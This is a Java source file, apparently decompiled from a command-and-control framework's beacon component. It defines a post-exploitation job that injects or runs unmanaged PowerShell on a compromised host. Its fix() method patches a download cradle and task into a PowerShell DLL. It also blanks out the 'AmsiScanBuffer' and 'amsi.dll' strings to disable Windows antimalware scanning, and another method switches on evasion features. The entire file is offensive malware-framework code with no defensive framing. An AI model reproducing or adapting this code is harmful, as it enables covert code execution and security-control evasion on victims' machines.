package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class PowerShellJob extends Job {
    protected String task;

    protected String cradle;

    protected String desc = "";

    public PowerShellJob(TaskBeacon taskBeacon, String string1, String string2) {
        super(taskBeacon);
        this.cradle = string1;
        this.task = string2;
    }

    public String getDescription() {
        return isInject() ? ("Tasked beacon to psinject: " + this.task + " into " + this.pid + " (" + this.arch + ")") : ("Tasked beacon to run: " + this.task + " (unmanaged)");
    }

    public String getShortDescription() {
        return "PowerShell (Unmanaged)";
    }

    public String getDLLName() {
        return "x64".equals(this.arch) ? "resources/powershell.x64.dll" : "resources/powershell.dll";
    }

    public String getPipeName() {
        return "powershell";
    }

    public String getTactic() {
        return "T1086";
    }

    public int getCallbackType() {
        return 32;
    }

    public int getWaitTime() {
        return 10000;
    }

    public boolean ignoreToken() {
        return false;
    }

    public byte[] fix(byte[] arrby) {
        Packer packer = new Packer();
        packer.addStringUTF8(this.cradle + this.task, 8192);
        arrby = CommonUtils.patch(arrby, "POWERSHELL ABCDEFGHIJKLMNOPQRSTUVWXYZ", CommonUtils.bString(packer.getBytes()));
        if (!this.tasker.disableAMSI())
            arrby = CommonUtils.zeroOut(arrby, new String[]{"AmsiScanBuffer", "amsi.dll"});
        return arrby;
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
        postExObfuscator.enableEvasions();
    }
}
